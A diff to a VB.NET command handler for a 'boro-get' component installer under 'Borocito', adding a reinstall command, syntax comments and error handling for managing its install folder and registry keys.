@@ -6,32 +6,34 @@ Namespace Boro_Get
         Function BORO_GET_ADMIN(ByVal command As String) As String
             Try
                 AddToLog("BOROGET", "Processing: " & command, False)
-                Dim boroGETcommand As String = command.Replace("boro-get", Nothing)
+                Dim boroGETcommand As String = command.Remove(0, 9)
                 boroGETcommand = boroGETcommand.TrimStart()
                 boroGETcommand = boroGETcommand.TrimEnd()
                 Select Case boroGETcommand
-                    Case "install"
+                    Case "install" 'boro-get install
                         Return InstallBOROGET()
-                    Case "uninstall"
+                    Case "uninstall" 'boro-get uninstall
                         Return UninstallBOROGET()
-                    Case "status"
+                    Case "reinstall" 'boro-get reinstall
+                        Return ReinstallBOROGET()
+                    Case "status" 'boro-get status
                         If isBoroGetInstalled() Then
                             Dim check_boroget As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
                             Return "Installed! (" & check_boroget.GetValue("Name") & " " & check_boroget.GetValue("Version") & ")"
                         Else
                             Return "No installed"
                         End If
-                    Case "set"
+                    Case "set" 'boro-get set llave|valors
                         Dim args() As String = boroGETcommand.Split("|")
                         Return SetBOROGET(args(1), args(2))
-                    Case "reset"
+                    Case "reset" 'boro-get reset
                         If My.Computer.FileSystem.DirectoryExists(DIRInstallFolder) Then
                             My.Computer.FileSystem.DeleteDirectory(DIRInstallFolder, FileIO.DeleteDirectoryOption.DeleteAllContents)
                         End If
                         Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
                         regKey.DeleteSubKeyTree("boro-get")
                         Return "Local repository has been cleared!"
-                    Case Else
+                    Case Else 'boro-get <component>, <run_or_not>, <params>...
                         If isBoroGetInstalled() Then
                             'paquete
                             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
@@ -120,6 +122,23 @@ Namespace Boro_Get
                 Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
                 regKey.DeleteSubKeyTree("boro-get")
                 Return "boro-get has been uninstalled!"
+            Catch ex As Exception
+                AddToLog("Uninstall@BOROGET", "Error: " & ex.Message, True)
+                Return "Error uninstalling boro-get."
+            End Try
+        End Function
+        Function ReinstallBOROGET() As String
+            Try
+                AddToLog("BOROGET", "Reinstalling boro-get...", False)
+                Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+                Dim boroget_FilePath As String = regKey.GetValue("boro-get")
+                'Eliminar los binarios. (NO COMPONENTES)
+                If My.Computer.FileSystem.FileExists(boroget_FilePath) Then
+                    My.Computer.FileSystem.DeleteFile(boroget_FilePath)
+                End If
+                'Volver a instalar
+                InstallBOROGET()
+                Return "boro-get has been reinstalled!"
             Catch ex As Exception
                 AddToLog("Uninstall@BOROGET", "Error: " & ex.Message, True)
                 Return "Error uninstalling boro-get."
